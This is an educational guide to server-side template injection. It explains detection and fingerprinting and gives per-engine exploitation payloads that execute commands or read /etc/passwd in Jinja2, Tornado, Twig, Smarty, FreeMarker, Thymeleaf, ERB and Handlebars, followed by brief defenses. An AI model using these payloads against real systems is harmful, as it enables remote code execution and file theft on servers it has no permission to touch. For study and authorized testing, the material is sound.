# SSTI (Server-Side Template Injection)

# Table of Contents
- So what's SSTI ?
- Template Engines
- Template Engine Identification
- Exploitation by Engine Type
- Defense and Mitigation
- Resources
- Conclusion

# Let's Start :
## So what's SSTI ?
**Server-Side Template Injection (SSTI)** is a critical web vulnerability that occurs when an application unsafely incorporates user input into server-side templates. Unlike simple output display issues, SSTI allows attackers to inject actual template syntax that gets executed on the server with the template engine's privileges. This happens due to inadequate input validation or sanitization, developers either fail to recognize where user input enters template contexts or implement insufficient filtering. Successful exploitation can lead to severe consequences including remote code execution, sensitive file reading, environment variable access, and complete server compromise. Despite being a well-documented vulnerability class, SSTI remains prevalent because template engines are deeply integrated into modern web frameworks, and developers often underestimate the attack surface. Meanwhile, security testers sometimes overlook these vulnerabilities as they require specific knowledge of each template engine's syntax and capabilities, making SSTI both dangerous and frequently missed in security assessments.

## Template Engines 
**Template Engines** are fundamental components in web development that dynamically generate HTML content by merging static template files with variable data. They allow developers to write template files, typically HTML documents interspersed with special placeholders and logic statements (the template syntax). The engine processes these templates, replacing the placeholders with actual user or application data to produce the final webpage sent to the client. This separates the presentation layer (the template) from the business logic and data.

Crucially for security, these engines are built on top of specific programming languages (e.g., Jinja2 on Python, Twig on PHP, Freemarker on Java), and each has its own unique syntax for variables, control structures, and sometimes even direct code execution. This diversity is precisely why the first step in exploiting an SSTI vulnerability is engine identification. An attacker must first deduce the underlying language family from the server's behavior and then pinpoint the exact engine by testing its unique syntax, as a payload designed for one engine will mostly fail against another.

## Template Engine Identification
**Template Engine Identification** is a systematic, two-stage process crucial for exploiting SSTI vulnerabilities. The first stage, ***Detection***, involves probing all available input vectors—such as URL parameters, form fields, and HTTP headers by injecting basic template syntax from various engines. The goal is to provoke an anomalous response from the server, which indicates that our input is being processed by a template engine. This can be achieved by intentionally causing syntax errors (e.g., using unmatched brackets like {}$<%) or executing simple operations (like {{ 7*7 }}), and then meticulously analyzing the application's output, headers, and even error messages for signs of server-side evaluation.

Once an injection point is confirmed, the second stage, ***Fingerprinting***, begins. This involves sending a series of engine-specific payloads designed to trigger unique behaviors. For instance, we test mathematical expressions (${7*7}, {{7*7}}, <%= 7*7 %>), object exposure probes (like {{config}} in Jinja2), or built-in variable references. By observing which payloads are executed successfully and comparing the output format and error messages, we can triangulate the specific template engine in use. While automated tools can assist in this process, a manual approach is often more reliable for dealing with custom or poorly documented engines, making this a critical skill for successful exploitation.

## Exploitation by Engine Type
### Python-based Templates
- Jinja2
```
Syntax: {{ }} for expressions, {% %} for statements
Detection: {{ 7*7 }} → 49
Exploitation Chain:
    ///Basic object traversal
    {{ ''.__class__ }}
    {{ ''.__class__.__mro__[1] }}
    {{ ''.__class__.__mro__[1].__subclasses__() }}

     ///Common RCE vectors
    {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
    {{ lipsum.__globals__['os'].popen('cat /flag').read() }}
    { cycler.__init__.__globals__.os.popen('id').read() }}
```
- Tornado
```
Syntax: {{ }} and {% %}
Detection: {{ 7*7 }} → 49
Exploitation:
    {% import os %}
    {{ os.popen('id').read() }}
    {{ __import__('os').popen('id').read() }}
```     
# PHP-based Templates
- Twig
```
Syntax: {{ }} and {% %}
Detection: {{ 7*7 }} → 49
Exploitation:
    {{ _self }}
    {{ _self.env }}
    {{ _self.env.getFilter('system')('id') }}
    {{ ['id']|map('system')|join }}
```
- Smarty
```
Syntax: { $variable }
Detection: { 7*7 } → 49
Exploitation:
    {php}shell_exec('id'){/php}
    {system('id')}
    {self::getStreamVariable('file:///etc/passwd')}
```
# Java-based Templates
- FreeMarker
```
Syntax: ${expression} and <#directive>
Detection: ${3*3} → 9
Exploitation:
    ${"freemarker.template.utility.Execute"?new()("whoami")}
    <#assign ex="freemarker.template.utility.Execute"?new()> 
    ${ ex("id") }
```
- Thymeleaf
```
Syntax: #{expression} and ${variable}
Detection: #{7*7} → 49
Exploitation:
    ${T(java.lang.Runtime).getRuntime().exec('id')}
    *{T(org.apache.tomcat.util.codec.binary.Base64).decode('eW91ci1jb21tYW5k')}
```
# Ruby-based Templates
- ERB (Embedded Ruby)
```
Syntax: <%= %> and <% %>
Detection: <%= 7*7 %> → 49
Exploitation:
    <%= Dir.entries('/') %>
    <%= File.open('/etc/passwd').read %>
    <%= system('cat /flag') %>
```
# JavaScript-based Templates
- Handlebars
```
Syntax: {{ }}
Detection: Limited execution context
Exploitation:
    {{#with "s" as |string|}}
        {{#with "e"}}
            {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').execSync('id');"}}
                {{this.pop}}
                {{#each conslist}}
                {{#with (string.sub.apply 0 codelist)}}
                    {{this}}
                {{/with}}
                {{/each}}
            {{/with}}
            {{/with}}
        {{/with}}
        {{/with}}
```
The techniques discussed in this guide are foundational. The security community maintains large, constantly updating repositories of payloads and bypass techniques. For a comprehensive and up-to-date collection, I highly encourage you to consult the **PayloadsAllTheThings** project on GitHub : ```https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection```

## Defense and Mitigation
1. ***Avoidance***: Restrict user template modification where possible
2. ***Logic-Less Engines***: Use Mustache, Handlebars, or similar to separate logic from presentation
3. ***Sandbox Execution***: Run user templates in restricted environments with dangerous functions removed
4. ***Container Isolation***: Deploy template processors in locked-down Docker containers to contain potential breaches

## Resources
- Intigriti artcile on SSTI : ```https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-server-side-template-injection-ssti```
- PortSwigger article on SSTI : ```https://portswigger.net/web-security/server-side-template-injection```

## Conclusion
As we move through 2025, server-side template injection remains a persistently relevant attack vector, highlighting the continued challenges developers face with input validation. The detection and exploitation methods covered in this guide not only provide offensive security testing tools but also emphasize the defensive measures necessary to protect against SSTI in an increasingly template-driven development landscape.
